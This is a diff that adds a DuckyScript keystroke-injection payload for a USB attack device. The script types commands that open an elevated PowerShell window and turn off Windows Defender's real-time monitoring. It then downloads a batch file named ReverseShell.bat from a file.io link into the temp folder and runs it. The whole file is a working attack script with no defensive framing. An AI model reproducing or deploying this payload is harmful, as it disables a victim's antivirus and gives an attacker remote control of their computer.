@@ -1,0 +1,24 @@
+DELAY 5000
+GUI r
+DELAY 750
+STRING powershell
+DELAY 750
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+DELAY 750
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 1000
+ENTER
+DELAY 1000
+STRING $tempBat = "$env:TEMP\ReverseShell.bat"; (New-Object Net.WebClient).DownloadFile('https://file.io/S1qIL4q0PejW', $tempBat); Start-Process $tempBat
+DELAY 750
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 750
+STRING exit
+ENTER
